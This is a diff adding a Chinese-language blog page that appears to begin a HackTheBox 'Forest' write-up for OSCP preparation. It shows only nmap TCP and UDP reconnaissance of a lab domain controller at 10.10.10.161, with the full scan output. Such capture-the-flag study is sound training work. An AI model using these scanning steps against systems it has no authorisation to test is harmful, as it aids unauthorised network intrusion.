@@ -1,0 +1,724 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="So1Lupus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ForestBox info  Reconnmap1nmap -sT -sC -sV -O -p 53,135,139,389,445,593,3268,47001 10.10.10.161  1234567891011121314151617181920212223242526272829303132333435363738394041424344Nmap scan report for 10.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Road-to-OSCP-4-Forest">
+<meta property="og:url" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/index.html">
+<meta property="og:site_name" content="So1Lupus">
+<meta property="og:description" content="ForestBox info  Reconnmap1nmap -sT -sC -sV -O -p 53,135,139,389,445,593,3268,47001 10.10.10.161  1234567891011121314151617181920212223242526272829303132333435363738394041424344Nmap scan report for 10.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/image-20230312205222691.png">
+<meta property="og:image" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/image-20230312212800728.png">
+<meta property="og:image" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/image-20230312213156062.png">
+<meta property="og:image" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/image-20230312213327732.png">
+<meta property="og:image" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/image-20230312213915439.png">
+<meta property="og:image" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/image-20230312214603499.png">
+<meta property="og:image" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/image-20230312214801416.png">
+<meta property="og:image" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/image-20230312215108184.png">
+<meta property="og:image" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/image-20230312215522843.png">
+<meta property="article:published_time" content="2023-03-12T14:02:28.000Z">
+<meta property="article:modified_time" content="2023-03-12T14:11:13.000Z">
+<meta property="article:author" content="So1Lupus">
+<meta property="article:tag" content="OSCP备考">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/image-20230312205222691.png">
+  
+  
+  
+  <title>Road-to-OSCP-4-Forest - So1Lupus</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>So1Lupus</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Road-to-OSCP-4-Forest"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-12 22:02" pubdate>
+          2023年3月12日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          121 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Road-to-OSCP-4-Forest</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Forest"><a href="#Forest" class="headerlink" title="Forest"></a>Forest</h1><h2 id="Box-info"><a href="#Box-info" class="headerlink" title="Box info"></a>Box info</h2><img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312205222691.png" srcset="/img/loading.gif" lazyload class="">
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sT -sC -sV -O -p <span class="hljs-number">53</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">593</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">47001</span> <span class="hljs-number">10.10.10.161</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.161</span><br><span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.56s</span> <span class="hljs-string">latency).</span><br><br><span class="hljs-string">PORT</span>      <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>      <span class="hljs-string">VERSION</span><br><span class="hljs-number">53</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">domain</span>       <span class="hljs-string">Simple</span> <span class="hljs-string">DNS</span> <span class="hljs-string">Plus</span><br><span class="hljs-number">135</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">139</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">netbios-ssn</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ssn</span><br><span class="hljs-number">389</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">htb.local,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span><br><span class="hljs-number">445</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">microsoft-ds</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">Standard</span> <span class="hljs-number">14393</span> <span class="hljs-string">microsoft-ds</span> <span class="hljs-string">(workgroup:</span> <span class="hljs-string">HTB)</span><br><span class="hljs-number">593</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span><br><span class="hljs-number">3268</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">htb.local,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span><br><span class="hljs-number">47001</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">http</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span><br><span class="hljs-attr">Warning:</span> <span class="hljs-string">OSScan</span> <span class="hljs-string">results</span> <span class="hljs-string">may</span> <span class="hljs-string">be</span> <span class="hljs-string">unreliable</span> <span class="hljs-string">because</span> <span class="hljs-string">we</span> <span class="hljs-string">could</span> <span class="hljs-string">not</span> <span class="hljs-string">find</span> <span class="hljs-string">at</span> <span class="hljs-string">least</span> <span class="hljs-number">1</span> <span class="hljs-string">open</span> <span class="hljs-string">and</span> <span class="hljs-number">1</span> <span class="hljs-string">closed</span> <span class="hljs-string">port</span><br><span class="hljs-attr">Aggressive OS guesses:</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">build</span> <span class="hljs-number">10586</span> <span class="hljs-bullet">-</span> <span class="hljs-number">14393</span> <span class="hljs-string">(96%),</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016</span> <span class="hljs-string">(95%),</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-number">10</span> <span class="hljs-number">1507</span> <span class="hljs-string">(93%),</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-number">10</span> <span class="hljs-number">1507</span> <span class="hljs-bullet">-</span> <span class="hljs-number">1607</span> <span class="hljs-string">(93%),</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2012</span> <span class="hljs-string">(93%),</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2012 </span><span class="hljs-string">R2</span> <span class="hljs-string">(93%),</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2012 </span><span class="hljs-string">R2</span> <span class="hljs-string">Update</span> <span class="hljs-number">1</span> <span class="hljs-string">(93%),</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-number">7</span><span class="hljs-string">,</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2012</span><span class="hljs-string">,</span> <span class="hljs-string">or</span> <span class="hljs-string">Windows</span> <span class="hljs-number">8.1</span> <span class="hljs-string">Update</span> <span class="hljs-number">1</span> <span class="hljs-string">(93%),</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Vista</span> <span class="hljs-string">SP1</span> <span class="hljs-bullet">-</span> <span class="hljs-string">SP2,</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2008 </span><span class="hljs-string">SP2,</span> <span class="hljs-string">or</span> <span class="hljs-string">Windows</span> <span class="hljs-number">7</span> <span class="hljs-string">(93%),</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-number">10</span> <span class="hljs-string">(92%)</span><br><span class="hljs-literal">No</span> <span class="hljs-string">exact</span> <span class="hljs-string">OS</span> <span class="hljs-string">matches</span> <span class="hljs-string">for</span> <span class="hljs-string">host</span> <span class="hljs-string">(test</span> <span class="hljs-string">conditions</span> <span class="hljs-string">non-ideal).</span><br><span class="hljs-attr">Network Distance:</span> <span class="hljs-number">2</span> <span class="hljs-string">hops</span><br><span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">FOREST;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows</span><br><br><span class="hljs-attr">Host script results:</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-security-mode:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">311:</span> <br><span class="hljs-string">|_</span>    <span class="hljs-string">Message</span> <span class="hljs-string">signing</span> <span class="hljs-string">enabled</span> <span class="hljs-string">and</span> <span class="hljs-string">required</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb-security-mode:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">account_used:</span> <span class="hljs-string">&lt;blank&gt;</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">authentication_level:</span> <span class="hljs-string">user</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">challenge_response:</span> <span class="hljs-string">supported</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">message_signing:</span> <span class="hljs-string">required</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-time:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">date:</span> <span class="hljs-number">2023-03-12T10:51:55</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">start_date:</span> <span class="hljs-number">2023-03-12T08:42:45</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb-os-discovery:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">Standard</span> <span class="hljs-number">14393</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">Standard</span> <span class="hljs-number">6.3</span><span class="hljs-string">)</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Computer name:</span> <span class="hljs-string">FOREST</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">NetBIOS computer name:</span> <span class="hljs-string">FOREST\x00</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Domain name:</span> <span class="hljs-string">htb.local</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Forest name:</span> <span class="hljs-string">htb.local</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">FQDN:</span> <span class="hljs-string">FOREST.htb.local</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">System time:</span> <span class="hljs-number">2023-03-12T03:51:56-07:00</span><br><span class="hljs-string">|_clock-skew:</span> <span class="hljs-attr">mean:</span> <span class="hljs-string">2h26m48s,</span> <span class="hljs-attr">deviation:</span> <span class="hljs-string">4h02m31s,</span> <span class="hljs-attr">median:</span> <span class="hljs-string">6m47s</span><br><br><span class="hljs-string">OS</span> <span class="hljs-string">and</span> <span class="hljs-string">Service</span> <span class="hljs-string">detection</span> <span class="hljs-string">performed.</span> <span class="hljs-string">Please</span> <span class="hljs-string">report</span> <span class="hljs-string">any</span> <span class="hljs-string">incorrect</span> <span class="hljs-string">results</span> <span class="hljs-string">at</span> <span class="hljs-string">https://nmap.org/submit/</span> <span class="hljs-string">.</span><br><span class="hljs-comment"># Nmap done at Sun Mar 12 18:45:31 2023 -- 1 IP address (1 host up) scanned in 58.26 seconds</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sU -sC -sV -O -p53,<span class="hljs-number">123</span>,<span class="hljs-number">389</span> <span class="hljs-number">10.10.10.161</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs wren"> <span class="hljs-title class_">Nmap</span> <span class="hljs-number">7.93</span> <span class="hljs-variable">scan</span> initiated <span class="hljs-title class_">Sun</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">12</span> <span class="hljs-number">18</span>:<span class="hljs-number">37</span>:<span class="hljs-number">38</span> <span class="hljs-number">2023</span> <span class="hljs-keyword">as</span>: <span class="hljs-variable">nmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">sU</span> <span class="hljs-operator">-</span><span class="hljs-variable">sC</span> <span class="hljs-operator">-</span><span class="hljs-variable">sV</span> <span class="hljs-operator">-</span><span class="hljs-variable">O</span> <span class="hljs-operator">-</span><span class="hljs-variable">p53</span>,<span class="hljs-number">123</span>,<span class="hljs-number">389</span> <span class="hljs-operator">-</span><span class="hljs-variable">oN</span> <span class="hljs-variable">udp</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.161</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.161</span><br><span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.56</span>s <span class="hljs-variable">latency</span>).<br><br><span class="hljs-variable">PORT</span>    <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span> <span class="hljs-variable">VERSION</span><br><span class="hljs-number">53</span>/<span class="hljs-variable">udp</span>  <span class="hljs-variable">open</span>  <span class="hljs-title function_">domain</span>  (<span class="hljs-variable">generic</span> <span class="hljs-variable">dns</span> <span class="hljs-variable">response</span>: <span class="hljs-variable">SERVFAIL</span>)<br><span class="hljs-operator">|</span> <span class="hljs-variable">fingerprint</span><span class="hljs-operator">-</span><span class="hljs-variable">strings</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">NBTStat</span>: <br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>    <span class="hljs-variable">CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="hljs-number">123</span>/<span class="hljs-variable">udp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">ntp</span>     <span class="hljs-variable">NTP</span> <span class="hljs-variable">v3</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">ntp</span><span class="hljs-operator">-</span>info: <br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <br><span class="hljs-number">389</span>/<span class="hljs-variable">udp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">ldap</span>    <span class="hljs-title class_">Microsoft</span> <span class="hljs-title class_">Windows</span> <span class="hljs-title class_">Active</span> <span class="hljs-title class_">Directory</span> <span class="hljs-title function_">LDAP</span> (<span class="hljs-title class_">Domain</span>: <span class="hljs-variable">htb</span>.<span class="hljs-property">local</span>, <span class="hljs-title class_">Site</span>: <span class="hljs-title class_">Default</span><span class="hljs-operator">-</span><span class="hljs-title class_">First</span><span class="hljs-operator">-</span><span class="hljs-title class_">Site</span><span class="hljs-operator">-</span><span class="hljs-title class_">Name</span>)<br><span class="hljs-number">1</span> <span class="hljs-variable">service</span> <span class="hljs-variable">unrecognized</span> <span class="hljs-variable">despite</span> returning <span class="hljs-variable">data</span>. <span class="hljs-title class_">If</span> <span class="hljs-variable">you</span> <span class="hljs-variable">know</span> <span class="hljs-variable">the</span> <span class="hljs-variable">service</span>/<span class="hljs-variable">version</span>, <span class="hljs-variable">please</span> <span class="hljs-variable">submit</span> <span class="hljs-variable">the</span> <span class="hljs-variable">following</span> <span class="hljs-variable">fingerprint</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-variable">SF</span><span class="hljs-operator">-</span><span class="hljs-title class_">Port</span>53<span class="hljs-operator">-</span><span class="hljs-variable">UDP</span>:<span class="hljs-variable">V</span><span class="hljs-operator">=</span><span class="hljs-number">7.93</span><span class="hljs-operator">%</span><span class="hljs-variable">I</span><span class="hljs-operator">=</span><span class="hljs-number">7</span><span class="hljs-operator">%</span><span class="hljs-variable">D</span><span class="hljs-operator">=</span><span class="hljs-number">3</span>/<span class="hljs-number">12</span><span class="hljs-operator">%</span><span class="hljs-title class_">Time</span><span class="hljs-operator">=</span><span class="hljs-number">640</span>DAB92<span class="hljs-operator">%</span><span class="hljs-variable">P</span><span class="hljs-operator">=</span><span class="hljs-variable">x86_64</span><span class="hljs-operator">-</span><span class="hljs-variable">pc</span><span class="hljs-operator">-</span><span class="hljs-variable">linux</span><span class="hljs-operator">-</span><span class="hljs-variable">gnu</span><span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-variable">NBTS</span><br><span class="hljs-variable">SF</span>:<span class="hljs-variable">tat</span>,<span class="hljs-number">32</span>,<span class="hljs-string">&quot;<span class="hljs-char escape_">\x80</span>\xf0<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x82</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\x20</span>CKAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="hljs-string">SF:AAAAAAA<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span>!<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\x01</span>&quot;</span>);<br><span class="hljs-title class_">Too</span> <span class="hljs-variable">many</span> <span class="hljs-variable">fingerprints</span> <span class="hljs-variable">match</span> <span class="hljs-variable language_">this</span> <span class="hljs-variable">host</span> <span class="hljs-variable">to</span> <span class="hljs-variable">give</span> <span class="hljs-variable">specific</span> <span class="hljs-variable">OS</span> <span class="hljs-variable">details</span><br><span class="hljs-title class_">Network</span> <span class="hljs-title class_">Distance</span>: <span class="hljs-number">2</span> <span class="hljs-variable">hops</span><br><span class="hljs-title class_">Service</span> <span class="hljs-title class_">Info</span>: <span class="hljs-title class_">Host</span>: <span class="hljs-variable">FOREST</span>; <span class="hljs-variable">OS</span>: <span class="hljs-title class_">Windows</span>; <span class="hljs-variable">CPE</span>: <span class="hljs-variable">cpe</span>:/<span class="hljs-variable">o</span>:<span class="hljs-variable">microsoft</span>:<span class="hljs-variable">windows</span><br><br><span class="hljs-title class_">Host</span> <span class="hljs-variable">script</span> <span class="hljs-variable">results</span>:<br><span class="hljs-operator">|</span><span class="hljs-variable">_clock</span><span class="hljs-operator">-</span><span class="hljs-variable">skew</span>: <span class="hljs-number">6</span>m51s<br><br><span class="hljs-variable">OS</span> <span class="hljs-variable">and</span> <span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br># <span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span> <span class="hljs-variable">at</span> <span class="hljs-title class_">Sun</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">12</span> <span class="hljs-number">18</span>:<span class="hljs-number">38</span>:<span class="hljs-number">29</span> <span class="hljs-number">2023</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">51.65</span> <span class="hljs-variable">seconds</span><br></code></pre></td></tr></table></figure>
+
